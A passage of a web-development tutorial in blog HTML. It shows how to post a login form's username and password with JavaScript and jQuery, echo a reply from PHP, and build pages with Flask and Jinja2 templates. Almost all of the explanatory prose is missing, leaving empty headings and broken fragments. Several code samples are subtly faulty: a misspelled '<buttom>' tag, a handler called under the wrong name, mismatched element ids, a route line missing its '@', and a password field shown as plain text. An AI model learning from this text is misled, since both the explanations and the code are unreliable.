class="headerlink" title="2.5.1 js"></a>2.5.1 js</h4><p><code>/www/js</code><code>main.js</code><br><code>index.html</code><code>&lt;head&gt;&lt;/head&gt;</code>:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/main.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-5-2-POST"><a href="#2-5-2-POST" class="headerlink" title="2.5.2 POST"></a>2.5.2 POST</h4><p><code>index.html</code>buttononclick:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;bu&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;submit()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>POST<a href="https://www.w3school.com.cn/tags/html_ref_httpmethods.asp"></a></p><h5 id="2-5-2-1-js"><a href="#2-5-2-1-js" class="headerlink" title="2.5.2.1 js"></a>2.5.2.1 js</h5><p><a href="https://blog.csdn.net/Lianxingjie_1024/article/details/80238139"></a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*https://blog.csdn.net/Lianxingjie_1024/article/details/80238139*/</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">post</span>(<span class="params">URL, PARAMS</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> temp = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;form&quot;</span>);</span><br><span class="line">    temp.<span class="property">action</span> = <span class="variable constant_">URL</span>;</span><br><span class="line">    temp.<span class="property">method</span> = <span class="string">&quot;post&quot;</span>;</span><br><span class="line">    temp.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> x <span class="keyword">in</span> <span class="variable constant_">PARAMS</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> opt = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;textarea&quot;</span>);</span><br><span class="line">        opt.<span class="property">name</span> = x;</span><br><span class="line">        opt.<span class="property">value</span> = <span class="variable constant_">PARAMS</span>[x];</span><br><span class="line">        <span class="comment">// alert(opt.name)</span></span><br><span class="line">        temp.<span class="title function_">appendChild</span>(opt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(temp);</span><br><span class="line">    temp.<span class="title function_">submit</span>();</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">submit</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> um=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;um&quot;</span>).<span class="property">value</span>;<span class="comment">// Id</span></span><br><span class="line"><span class="keyword">var</span> pd=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pd&quot;</span>).<span class="property">value</span>;<span class="comment">// Id</span></span><br><span class="line"><span class="keyword">var</span> rt=<span class="title function_">post</span>(<span class="string">&#x27;&#x27;</span>, &#123;<span class="attr">password</span>:pd,<span class="attr">username</span>:um&#125;);</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;&quot;</span>+rt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post<a href="https://www.cnblogs.com/arealy/p/10233220.html"></a></p><h5 id="2-5-2-2-JQ"><a href="#2-5-2-2-JQ" class="headerlink" title="2.5.2.2 JQ"></a>2.5.2.2 JQ</h5><p><code>index.html</code><code>&lt;head&gt;&lt;/head&gt;</code>:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span></span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.4.1.min.js&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">integrity</span>=<span class="string">&quot;sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>jq<code>main.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">submit</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> um=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;um&quot;</span>).<span class="property">value</span>;</span><br><span class="line"><span class="keyword">var</span> pd=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pd&quot;</span>).<span class="property">value</span>;</span><br><span class="line">$.<span class="title function_">post</span>(<span class="string">&quot;&quot;</span>,&#123;</span><br><span class="line"><span class="attr">username</span>:um,</span><br><span class="line"><span class="attr">password</span>:pd</span><br><span class="line"></span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span>(<span class="params">data,status</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;: \n&quot;</span> + data + <span class="string">&quot;\n: &quot;</span> + status);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ajax post<a href="https://baijiahao.baidu.com/s?id=1621600925778526737&wfr=spider&for=pc"></a>php(<a href="https://blog.csdn.net/qq_40832960/article/details/104132721"></a>)</p><h5 id="2-5-2-3-"><a href="#2-5-2-3-" class="headerlink" title="2.5.2.3 "></a>2.5.2.3 </h5><p><code>index.html</code><code>input_f</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;input_f&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;php&quot;</span> <span class="attr">type</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;um&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;pd&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;passwords&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;bu&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><h3 id="2-6-"><a href="#2-6-" class="headerlink" title="2.6 "></a>2.6 </h3><p><a href="https://www.runoob.com/"></a><br><a href="https://www.w3school.com.cn/">w3school</a><br><strong><a href="https://github.com/Nambers/LoginHTML">github</a></strong></p><h2 id="3-php"><a href="#3-php" class="headerlink" title="3 php"></a>3 php</h2><blockquote><p>php, python flash, go <br>php, python flash, go <br>php, python flash, go </p></blockquote><h3 id="3-1-"><a href="#3-1-" class="headerlink" title="3.1  "></a>3.1  </h3><p>PHP<br>PHP</p><p>PHP<br>php</p><p>PHPhtml<br>post</p><p>phpphp<a href="https://www.php.cn/php-weizijiaocheng-390592.html"></a></p><h3 id="3-2-php"><a href="#3-2-php" class="headerlink" title="3.2  php"></a>3.2  php</h3><p>php<code>.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php&lt;?php?&gt;</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;a&quot;</span>;<span class="comment">//</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;<span class="comment">//aa</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>phphtml:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>My first PHP page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">echo &quot;Hello World!&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/php-syntax.html"></a><br>PHP<a href="https://www.runoob.com/php/php-tutorial.html"></a></p><h3 id="3-3-"><a href="#3-3-" class="headerlink" title="3.3 "></a>3.3 </h3><p></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$um</span>=<span class="variable">$_POST</span>[<span class="string">&quot;um&quot;</span>];<span class="comment">//</span></span><br><span class="line"><span class="variable">$pd</span>=<span class="variable">$_POST</span>[<span class="string">&quot;pd&quot;</span>];<span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$um</span>==<span class="string">&quot;&quot;</span>&amp;&amp;<span class="variable">$pd</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>post<code></code><code></code></p><h2 id="4-python-flask"><a href="#4-python-flask" class="headerlink" title="4 python flask"></a>4 python flask</h2><h3 id="4-1-"><a href="#4-1-" class="headerlink" title="4.1. "></a>4.1. </h3><h4 id="4-1-1-python"><a href="#4-1-1-python" class="headerlink" title="4.1.1 python"></a>4.1.1 python</h4><p>pythonCJavaBasicJavaScriptc</p><p><br><a href="https://www.liaoxuefeng.com/wiki/1016959663602400"></a><br><a href="https://www.runoob.com/python/python-tutorial.html"></a></p><p>pythonhtml+js+csspython</p><blockquote><p>pythonanacoda<br>3.6.2</p></blockquote><h4 id="4-1-2-flask"><a href="#4-1-2-flask" class="headerlink" title="4.1.2 flask"></a>4.1.2 flask</h4><p>FlaskJinja2Werkzeugpython</p><ul><li></li><li>Jinjia2</li><li></li><li>cookies</li><li></li><li>Restful</li><li>WSGI 1.0</li><li>unicode</li><li><br>flask</li></ul><p>python<a href="https://www.jianshu.com/p/30dbd8c3f7e4"></a><br><a href="https://dormousehole.readthedocs.io/en/latest/">flask</a></p><h4 id="4-1-3-flask-"><a href="#4-1-3-flask-" class="headerlink" title="4.1.3 flask "></a>4.1.3 flask </h4><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask</span><br></pre></td></tr></table></figure><blockquote><p>vscode</p></blockquote><h4 id="4-1-4-flask-"><a href="#4-1-4-flask-" class="headerlink" title="4.1.4 flask "></a>4.1.4 flask </h4><p><br><strong>flask-demo</strong>()<br><strong>templates</strong>()<br><strong>-run.py</strong>()<br><strong>-tempcoderunnerfile.py</strong>()</p><p><br><img src="/images/%E4%BD%BF%E7%94%A8html+css+js%E5%88%B6%E4%BD%9C%E7%BD%91%E7%AB%99%E6%95%99%E7%A8%8B.md-11.png" alt=""></p><h3 id="4-2-"><a href="#4-2-" class="headerlink" title="4.2 "></a>4.2 </h3><h4 id="4-2-1-flask-"><a href="#4-2-1-flask-" class="headerlink" title="4.2.1 flask "></a>4.2.1 flask </h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># index</span></span><br><span class="line"><span class="comment">#@app.route(&#x27;/login&#x27;) def login()</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="string">&#x27;5000&#x27;</span>, debug=<span class="literal">True</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>127.0.0.1:5000ip</p><h4 id="4-2-2-flask-"><a href="#4-2-2-flask-" class="headerlink" title="4.2.2 flask "></a>4.2.2 flask </h4><p>flask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template(<span class="string">&#x27;index.html&#x27;</span>) </span><br></pre></td></tr></table></figure><p>index.htmlindex.html</p><h4 id="4-2-3-flask-"><a href="#4-2-3-flask-" class="headerlink" title="4.2.3 flask "></a>4.2.3 flask </h4><p>flask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render_template(<span class="string">&#x27;index.html&#x27;</span>,a=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>index.htmla1</p><h4 id="4-2-4-flask-"><a href="#4-2-4-flask-" class="headerlink" title="4.2.4 flask "></a>4.2.4 flask </h4><p>routea&#x3D;1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.route(<span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    l = request.args.get(<span class="string">&#x27;a&#x27;</span>, <span class="number">0</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br></pre></td></tr></table></figure><h3 id="4-3-"><a href="#4-3-" class="headerlink" title="4.3 "></a>4.3 </h3><h4 id="4-3-1-"><a href="#4-3-1-" class="headerlink" title="4.3.1 "></a>4.3.1 </h4><p>flask <code>&lt;head&gt;</code>flask</p><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;head.html&quot; %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>head.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hi<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://lib.sinaapp.com/js/jquery/2.0.2/jquery-2.0.2.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;% block body %&#125;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="4-3-2-"><a href="#4-3-2-" class="headerlink" title="4.3.2 "></a>4.3.2 </h4><p>a&#x3D;1</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h</span>&gt;</span>&#123;&#123; a &#125;&#125;<span class="tag">&lt;/<span class="name">h</span>&gt;</span></span><br></pre></td></tr></table></figure><p>h1flask</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&#123;% if a==1 %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="4-3-3-"><a href="#4-3-3-" class="headerlink" title="4.3.3 "></a>4.3.3 </h4><p>postgetjqajax</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sign_up</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> x = $(<span class="string">&quot;#i&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line">        <span class="keyword">if</span> (x != <span class="string">&quot;&quot;</span> &amp;&amp; x != <span class="string">&quot; &quot;</span>) &#123;</span><br><span class="line">            $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">                <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">                <span class="attr">url</span>: <span class="string">&quot;&#123;&#123; url_for(&#x27;login&#x27;) &#125;&#125;&quot;</span>,</span><br><span class="line">                <span class="comment">//url_for</span></span><br><span class="line">                <span class="attr">data</span>: &#123;</span><br><span class="line">                    <span class="attr">sign_up_name</span>: x</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">dataType</span>: <span class="string">&quot;html&quot;</span>,</span><br><span class="line">                <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="4-3-4-"><a href="#4-3-4-" class="headerlink" title="4.3.4 "></a>4.3.4 </h4><p><code>login.html</code> </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;head.html&quot; %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>sign in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;u&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">buttom</span> <span class="attr">onclick</span>=<span class="string">&quot;sign_in()&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">buttom</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">sign_up</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> x = $(<span class="string">&quot;#i&quot;</span>).<span class="title function_">val</span>();</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (x != <span class="string">&quot;&quot;</span> &amp;&amp; x != <span class="string">&quot; &quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">type</span>: <span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">url</span>: <span class="string">&quot;&#123;&#123; url_for(&#x27;login&#x27;) &#125;&#125;&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="attr">sign_up_name</span>: x</span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">dataType</span>: <span class="string">&quot;html&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                </span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p><code>head.html</code>jq</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hi<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--- jq---&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://lib.sinaapp.com/js/jquery/2.0.2/jquery-2.0.2.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;% block body %&#125;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-4--"><a href="#4-4--" class="headerlink" title="4.4 +"></a>4.4 +</h3><p>run.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, url_for, request, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>,  debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>templates\head.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hi<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--- jq---&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://lib.sinaapp.com/js/jquery/2.0.2/jquery-2.0.2.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    &#123;% block body %&#125;</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>templates\index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;head.html&quot; %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span 